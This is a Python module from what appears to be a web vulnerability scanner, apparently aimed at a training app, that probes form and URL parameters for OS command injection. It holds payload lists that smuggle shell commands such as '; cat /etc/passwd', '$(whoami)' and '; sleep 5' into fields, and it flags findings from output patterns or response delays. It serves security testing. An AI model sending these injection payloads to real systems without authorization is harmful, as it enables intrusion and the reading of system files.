# ── dynamic/cmdi_injector.py ─────────────────────────────────────────────────

import time
import requests
from bs4 import BeautifulSoup

import config

# ── Output patterns that confirm command execution ────────────────────────────
CMD_PATTERNS = [
    "root:",            # /etc/passwd
    "uid=",             # id command output
    "gid=",             # id command output
    "windows",          # Windows system info
    "win32",            # Windows
    "volume serial",    # Windows dir output
    "directory of",     # Windows dir output
    "/bin/",            # Linux path in output
    "/usr/",            # Linux path in output
    "daemon:",          # /etc/passwd entry
    "nobody:",          # /etc/passwd entry
    "sh:",              # shell error
    "command not found",# shell error
    "permission denied",# shell error
]

# ── Payload sets ──────────────────────────────────────────────────────────────
# Each payload tries to run a command and produce visible output
OUTPUT_PAYLOADS = [
    "; whoami",
    "| whoami",
    "& whoami",
    "; id",
    "| id",
    "& id",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "; ls",
    "| ls",
    "; dir",
    "| dir",
    "\n whoami",
    "`whoami`",
    "$(whoami)",
]

# Time-based payloads for blind CMDi (when output is not reflected)
TIME_PAYLOADS = [
    "; sleep 5",
    "| sleep 5",
    "& sleep 5",
    "; ping -c 5 127.0.0.1",
    "& timeout 5",          # Windows
    "| timeout /t 5",       # Windows
]

# URLs to skip
SKIP_URLS = [
    'setup.php', 'logout.php', 'phpinfo.php',
    'security.php', 'upload.php', 'brute/',
    'captcha', 'javascript/', 'cryptography',
    'instructions.php', 'fi/',
]


class CMDiInjector:
    """
    Tests each endpoint parameter for Command Injection using:
    - Output-based : looks for OS command output patterns in the response
    - Time-based   : measures response delay after sleep/ping payloads
    """

    def __init__(self, session: requests.Session,
                 scan_manager, auth: dict = None):
        self.session      = session
        self.scan_manager = scan_manager
        self.auth         = auth

    # ── Public entry point ────────────────────────────────────────────────────

    def run(self, endpoints: list) -> list:
        if not self.scan_manager.is_active('cmdi'):
            return []

        findings = []
        print("  [CMDi] Starting Command Injection tests...")

        safe_endpoints = [
            ep for ep in endpoints
            if not any(skip in ep['url'] for skip in SKIP_URLS)
        ]

        total = sum(len(ep['params']) for ep in safe_endpoints)
        print(f"  [CMDi] Testing {total} parameter(s) across "
              f"{len(safe_endpoints)} endpoint(s)...")

        for ep in safe_endpoints:
            for param in ep['params']:
                if param.lower() in ('submit', 'btnsign',
                                     'btnclear', 'send'):
                    continue
                result = self._test_parameter(ep, param)
                if result:
                    findings.append(result)
                    break

        print(f"  [CMDi] Done. Found {len(findings)} CMDi finding(s).")
        return findings

    # ── Re-authentication ─────────────────────────────────────────────────────

    def _reauth(self):
        if not self.auth:
            return False
        try:
            login_url = self.auth['url']
            resp      = self.session.get(
                login_url, timeout=config.REQUEST_TIMEOUT,
                allow_redirects=True
            )
            soup      = BeautifulSoup(resp.text, 'html.parser')
            post_data = {}
            for h in soup.find_all('input', type='hidden'):
                if h.get('name'):
                    post_data[h['name']] = h.get('value', '')
            post_data[self.auth['username_field']] = self.auth['username']
            post_data[self.auth['password_field']] = self.auth['password']
            for k, v in self.auth.get('extra_fields', {}).items():
                post_data[k] = v
            r = self.session.post(
                login_url, data=post_data,
                timeout=config.REQUEST_TIMEOUT, allow_redirects=True
            )
            if 'login' not in r.url.lower():
                print(f"  [CMDi] Re-authenticated.")
                return True
        except Exception:
            pass
        return False

    # ── Core detection ────────────────────────────────────────────────────────

    def _test_parameter(self, ep: dict, param: str) -> dict:
        # 1. Output-based
        finding = self._test_output_based(ep, param)
        if finding:
            return finding
        # 2. Time-based
        finding = self._test_time_based(ep, param)
        return finding

    def _test_output_based(self, ep: dict, param: str) -> dict:
        """Inject command payloads and look for OS command output."""
        for payload in OUTPUT_PAYLOADS:
            response = self._send(ep, param, payload)
            if response is None:
                continue

            if self._is_login_page(response):
                print(f"  [CMDi] Session expired, re-authenticating...")
                if self._reauth():
                    response = self._send(ep, param, payload)
                    if response is None or self._is_login_page(response):
                        return None
                else:
                    return None

            body = response.text.lower()
            for pattern in CMD_PATTERNS:
                if pattern.lower() in body:
                    print(f"  [CMDi] ✓ Output-based CMDi: {ep['url']} "
                          f"param='{param}' payload='{payload}'")
                    return self._make_finding(
                        ep       = ep,
                        param    = param,
                        payload  = payload,
                        method   = "output-based",
                        evidence = f"Command output pattern detected: '{pattern}'"
                    )
        return None

    def _test_time_based(self, ep: dict, param: str) -> dict:
        """Inject sleep payloads and measure response delay."""
        for payload in TIME_PAYLOADS:
            start    = time.time()
            response = self._send(ep, param, payload)
            elapsed  = time.time() - start

            if response is None:
                continue

            if self._is_login_page(response):
                if self._reauth():
                    continue
                return None

            if elapsed >= config.TIME_BASED_DELAY:
                print(f"  [CMDi] ✓ Time-based CMDi: {ep['url']} "
                      f"param='{param}' delay={elapsed:.1f}s")
                return self._make_finding(
                    ep       = ep,
                    param    = param,
                    payload  = payload,
                    method   = "time-based",
                    evidence = f"Response delayed {elapsed:.1f}s "
                               f"(threshold: {config.TIME_BASED_DELAY}s)"
                )
        return None

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _is_login_page(self, response) -> bool:
        if response is None:
            return False
        if 'login' in response.url.lower():
            return True
        if 'login.css' in response.text.lower():
            return True
        return False

    def _get_user_token(self, url: str) -> str:
        try:
            resp  = self.session.get(
                url, timeout=config.REQUEST_TIMEOUT,
                allow_redirects=True
            )
            soup  = BeautifulSoup(resp.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})
            return token['value'] if token else ''
        except Exception:
            return ''

    def _send(self, ep: dict, param: str,
              payload: str) -> requests.Response:
        clean_url = ep['url'].split('#')[0]
        params    = dict(ep['params'])
        params[param] = payload

        if 'user_token' in params:
            params['user_token'] = self._get_user_token(clean_url)

        try:
            if ep['method'] == 'POST':
                return self.session.post(
                    clean_url, data=params,
                    timeout=config.REQUEST_TIMEOUT + config.TIME_BASED_DELAY,
                    allow_redirects=True
                )
            else:
                return self.session.get(
                    clean_url, params=params,
                    timeout=config.REQUEST_TIMEOUT + config.TIME_BASED_DELAY,
                    allow_redirects=True
                )
        except Exception:
            return None

    def _make_finding(self, ep, param, payload,
                      method, evidence) -> dict:
        return {
            'type'             : 'cmdi',
            'owasp'            : 'A03:2021 - Injection',
            'url'              : ep['url'].split('#')[0],
            'method'           : ep['method'],
            'parameter'        : param,
            'payload'          : payload,
            'technique'        : method,
            'evidence_dynamic' : evidence,
            'evidence_static'  : None,
            'confidence'       : 0.65,
            'module'           : 'dynamic',
            'finding_type'     : 3,
        }
